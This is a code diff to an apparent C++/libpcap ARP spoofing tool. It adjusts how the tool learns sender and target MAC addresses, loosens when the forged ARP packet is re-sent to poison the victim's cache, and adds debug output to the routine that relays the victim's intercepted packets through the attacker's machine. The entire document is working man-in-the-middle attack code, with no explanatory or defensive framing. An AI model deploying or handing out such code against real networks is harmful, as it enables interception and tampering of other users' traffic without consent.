@@ -25,7 +25,7 @@ void arp_spoofing::SetTarget(const u_char* ip){
         sleep(1);
 
         if (arpcd::IsReplyPacket(packet,
-                                 Attacker->GetIpAddress(),
+                                 ip,
                                  Attacker->GetMacAddress())){
             REP_PACKET = new arp_packet(packet);
             Target = new Address(REP_PACKET->GetEthernet()->GetSoruce(), ip);
@@ -55,7 +55,7 @@ void arp_spoofing::SetSender(const u_char* ip){
         if (res == -1 || res == -2) return;
 
         if (arpcd::IsReplyPacket(packet,
-                                 Attacker->GetIpAddress(),
+                                 ip,
                                  Attacker->GetMacAddress())){
             REP_PACKET = new arp_packet(packet);
             Sender = new Address(REP_PACKET->GetEthernet()->GetSoruce(), ip);
@@ -77,14 +77,17 @@ void arp_spoofing::SetAttacker(){
 
 void arp_spoofing::Init(const char* sender, const char* target){
     char errbuf[PCAP_ERRBUF_SIZE];
-    handle = pcap_open_live(Dev, BUFSIZ, 1, 1000, errbuf);
+    handle = pcap_open_live(Dev, BUFSIZ, 1, 1, errbuf);
 
+    printf("Sender IP: %s\nTarget IP: %s\n", sender, target);
+    u_char* sender_hex =conv::ipv4_to_hex(sender);
+    printf("[-] Set Attacker...\n");
     SetAttacker();
-    printf("Set Attacker\n");
-    SetSender(conv::ipv4_to_hex(sender));
-    printf("Set Sender\n");
+    printf("[-] Set Sender..\n");
+    SetSender(sender_hex);
+    print(Sender->GetMacAddress(), MAC_SIZE);
+    printf("[-] Set Target...\n");
     SetTarget(conv::ipv4_to_hex(target));
-    printf("Set Target\n");
 
     signal(SIGINT, sig_handler);
 }
@@ -101,9 +104,9 @@ void arp_spoofing::ExecuteArpSpoofing() {
         if (res == 0) continue;
         if (res == -1 || res == -2) return;
 
-        if(arpcd::IsBroadcastArp(packet, Sender->GetMacAddress()) &&
-                arpcd::IsCacheUpdate(packet, Target->GetIpAddress(), Target->GetMacAddress())){
-            pcap_sendpacket(handle, attack_packet, 60);
+        if(arpcd::IsBroadcastArp(packet, Sender->GetMacAddress()) ||
+                arpcd::IsCacheUpdate(packet, Target->GetIpAddress(), Sender->GetMacAddress())){
+            pcap_sendpacket(handle, attack_packet, 58);
         }
         else if (pcktcd::IsSenderPacket(packet, Sender->GetMacAddress(), Attacker->GetMacAddress())){
             int packet_size = (int)header->len;
@@ -111,6 +114,7 @@ void arp_spoofing::ExecuteArpSpoofing() {
             u_char* attacker_mac = Attacker->GetMacAddress();
             u_char* target_mac = Target->GetMacAddress();
 
+            print(target_mac, MAC_SIZE);
             memcpy(relay_packet, packet, (size_t)packet_size);
             for (int i=0; i < 6; i++) {
                 relay_packet[i + 6] = attacker_mac[i];
